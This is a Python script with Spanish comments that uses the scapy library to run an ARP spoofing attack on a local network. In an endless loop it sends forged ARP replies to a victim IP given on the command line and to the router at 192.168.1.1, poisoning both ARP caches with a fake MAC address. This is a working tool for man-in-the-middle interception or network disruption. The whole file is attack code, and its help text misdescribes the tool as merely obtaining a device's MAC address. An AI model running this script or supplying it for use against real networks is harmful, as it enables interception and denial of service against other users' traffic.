#!/usr/bin/env python3

import sys
import argparse
import signal
import time
import scapy.all as scapy
from termcolor import colored


# Ctrl + c
def ctrl_c(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)


# Panel de ayuda y declaración de argumentos o parámetros
def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta que envía paquetes ARP falsificados para obtener la dirección MAC de otro dispositivo conectado en la misma red")
    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Host / IP range to spoof")
    return parser.parse_args()

# Función que recibe la IP del equipo víctima y del router. Esta función crea un paquete ARP falsificado que contendra una respuesta 
def spoof(ip_address, spoof_ip):
    # op=2 enviar un paquete de respuesta, psrc=IP del router pdst=IP de victima, hesrc=MAC falsificada supuestamente de router 
    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:11:22:33")
    scapy.send(arp_packet, verbose=False) # Enviar el paquete

# Función principal que llama a las demas funciones para que puedan ser ejecutadas
def main():
    arguments = get_arguments() 
    while True:
        spoof(arguments.ip_address, "192.168.1.1")
        spoof("192.168.1.1", arguments.ip_address)
        time.sleep(2)


if __name__ == '__main__':
    main()
